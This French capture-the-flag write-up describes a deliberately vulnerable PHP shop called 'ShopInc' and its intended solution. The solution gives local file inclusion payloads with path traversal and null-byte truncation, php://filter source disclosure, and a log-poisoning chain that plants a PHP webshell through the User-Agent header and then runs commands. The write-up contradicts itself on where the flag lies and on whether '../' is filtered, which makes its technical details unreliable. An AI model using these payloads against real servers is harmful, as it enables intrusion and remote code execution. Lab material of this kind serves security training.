# Challenge CTF WEB : "ShopInc"

**Difficulté :** Intermédiaire
**Compétence visée :** Local File Inclusion (LFI), découverte de fichiers sensibles, exécution de code à distance (RCE - via LFI to RCE)
**Contexte :** Site de e-commerce minimaliste

---

## Description du Challenge

Bienvenue sur **ShopInc**, votre nouvelle boutique en ligne préférée ! Parcourez notre catalogue et découvrez nos produits innovants. En explorant le site, vous pourriez remarquer une fonctionnalité qui inclut dynamiquement du contenu. Votre mission est d'exploiter cette vulnérabilité pour accéder à des fichiers sensibles du serveur et, idéalement, obtenir une exécution de code à distance afin de trouver le flag caché.

## Déploiement du Challenge

1.  **Prérequis :**
    * **Docker**
    * **Docker Compose**

2.  **Préparation des fichiers :**
    * Assurez-vous d'avoir créé la structure de dossiers comme décrit (`shopinc/app/`, `shopinc/app/products/`, etc.).
    * Copiez-collez le contenu fourni dans chaque fichier respectif.

3.  **Lancer le conteneur Docker :**
    * Ouvrez votre terminal ou invite de commande.
    * Naviguez jusqu'au répertoire `shopinc` (le dossier parent contenant `Dockerfile`, `docker-compose.yml` et le dossier `app`).
    * Exécutez la commande suivante pour construire l'image et lancer le conteneur :
        ```bash
        docker-compose up --build -d
        ```
        * `--build` : Construit l'image Docker (nécessaire la première fois ou après des modifications du `Dockerfile`).
        * `-d` : Lance le conteneur en arrière-plan (mode détaché).

4.  **Accéder au challenge :**
    * Une fois le conteneur lancé (cela peut prendre quelques secondes), ouvrez votre navigateur web.
    * Accédez au challenge en utilisant l'URL suivante (assurez-vous d'utiliser `http://`) :
        ```
        http://localhost:80
        ```
        ou simplement
        ```
        http://localhost
        ```
    * Si vous rencontrez une erreur comme `SSL_ERROR_RX_RECORD_TOO_LONG`, c'est que votre navigateur essaie d'utiliser HTTPS. Assurez-vous bien de taper `http://` explicitement.

## Solution Attendue (pour le créateur du challenge)

Le but est d'exploiter la Local File Inclusion (LFI) sur le paramètre `page` dans `view.php` pour lire le fichier `flag.txt` situé à la racine du dossier `/var/www/html` dans le conteneur (`app/flag.txt` sur votre machine hôte) et potentiellement d'autres fichiers sensibles.

### Étapes de résolution :

1.  **Découverte de la LFI :**
    * Accédez à la page d'accueil : `http://localhost/`
    * Cliquez sur "Produits" ou sur les liens "Voir Détails". Vous remarquerez que l'URL change en `http://localhost/view.php?page=product_a` (ou `product_b`).
    * Tentez de modifier le paramètre `page` :
        * `http://localhost/view.php?page=non_existent_file` : Ceci devrait provoquer une erreur "Fichier ou page introuvable", confirmant que le paramètre `page` est utilisé pour inclure des fichiers.
        * Tentez d'inclure `/etc/passwd` : `http://localhost/view.php?page=/etc/passwd`. Le filtre devrait bloquer cette tentative avec le message "Accès non autorisé !".

2.  **Analyse et Contournement des Filtres :**
    * Le code dans `view.php` contient un filtre qui bloque `../`, `/etc/`, `php://input`, `data://`, et `phar://`. Il nettoie également les extensions communes comme `.php`, `.html`, `.txt`, `.log`.
    * Le **Null Byte (%00)** est le contournement clé pour ce challenge. Le `str_ireplace` et le `file_exists` de PHP s'arrêtent souvent à un Null Byte.
    * L'application ajoute `.php` à la fin du nom de fichier inclus par défaut (ex: `products/votre_parametre.php`).

3.  **Exploitation de la LFI pour lire des fichiers sensibles :**
    * **Lire `/etc/passwd` :**
        * Pour contourner le filtre qui ajoute `.php` et le chemin relatif :
            `http://localhost/view.php?page=../../../../etc/passwd%00`
        * Le `../../../../` permet de remonter à la racine du système de fichiers. Le `%00` tronque le `.php` ajouté par le script.
    * **Lire le code source des fichiers de l'application (utile pour découvrir le flag ou des indices) :**
        * Le filtre bloque `resource=config` et `resource=flag`. Vous ne pouvez donc pas lire `db_config.php` ou `flag.txt` directement avec `php://filter`.
        * Cependant, vous pouvez lire `index.php` ou `view.php` : `http://localhost/view.php?page=php://filter/convert.base64-encode/resource=index%00` (ou `view%00`).
        * Décodez le résultat en Base64 pour voir le code source et confirmer la logique.

4.  **LFI to RCE (Exécution de Code à Distance) via Logs Apache :**
    * **Injection de code dans les logs :** Le moyen le plus courant pour ce type de LFI. Faites une requête HTTP à n'importe quelle page du site (ex: `http://localhost/`), mais modifiez l'en-tête `User-Agent` pour y inclure un webshell PHP.
        * Exemple de `User-Agent` à envoyer (via Burp Suite ou `curl`):
            ```
            User-Agent: <?php system($_GET['cmd']); ?>
            ```
        * **Avec `curl` :**
            ```bash
            curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost/
            ```
            (Assurez-vous d'échapper les caractères spéciaux dans le shell si vous copiez-collez directement).
    * **Inclusion du fichier de log :**
        * Maintenant que votre code PHP est dans le fichier de log Apache (`/var/log/apache2/access.log`), incluez ce fichier via LFI avec le contournement du Null Byte :
            ```
            http://localhost/view.php?page=../../../../var/log/apache2/access.log%00
            ```
    * **Exécution de commandes :**
        * Votre webshell est maintenant actif. Ajoutez le paramètre `&cmd=` à l'URL pour exécuter des commandes :
            ```
            http://localhost/view.php?page=../../../../var/log/apache2/access.log%00&cmd=ls -la /
            ```
        * Vous devriez voir `flag.txt` dans le répertoire `/`.

5.  **Récupération du Flag :**
    * Utilisez la commande `cat` pour lire le flag :
        ```
        http://localhost/view.php?page=../../../../var/log/apache2/access.log%00&cmd=cat /flag.txt
        ```
    * Le flag sera affiché dans la page.

## Nettoyage

Pour arrêter et supprimer les conteneurs et les images Docker de ce challenge :
```bash
docker-compose down --rmi all